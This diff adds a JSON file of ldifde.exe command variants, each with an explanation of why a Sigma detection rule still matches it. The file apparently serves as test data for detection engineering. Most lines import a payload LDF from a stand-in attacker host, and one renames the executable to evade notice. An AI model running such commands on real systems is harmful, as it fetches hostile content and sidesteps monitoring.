@@ -1,0 +1,22 @@
+[
+  {
+    "output": "ldifde.exe -i -f http://example.com/payload.ldf",
+    "explanation": "This is the original true positive command and matches the Sigma rule exactly."
+  },
+  {
+    "output": "ldifde.exe /i /f C:\\path\\to\\file.ldf",
+    "explanation": "This command uses substitution of short/long options (-i to /i) and is still detected by the Sigma rule."
+  },
+  {
+    "output": "copy ldifde.exe not_suspicious.exe && not_suspicious.exe /i /f http://attacker.com/payload.ldf",
+    "explanation": "This command renames the executable but still uses the same flags, and is detected by the Sigma rule."
+  },
+  {
+    "output": "ldifde.exe -i -f \"http://attacker.com/payload.ldf\" -u",
+    "explanation": "This command adds an extra flag (-u) but still includes the required -i and -f flags, and is detected by the Sigma rule."
+  },
+  {
+    "output": "ldifde.exe /i /f http://attacker.com/payload.ldf",
+    "explanation": "This command uses substitution of short/long options (-i to /i) and is still detected by the Sigma rule."
+  }
+]
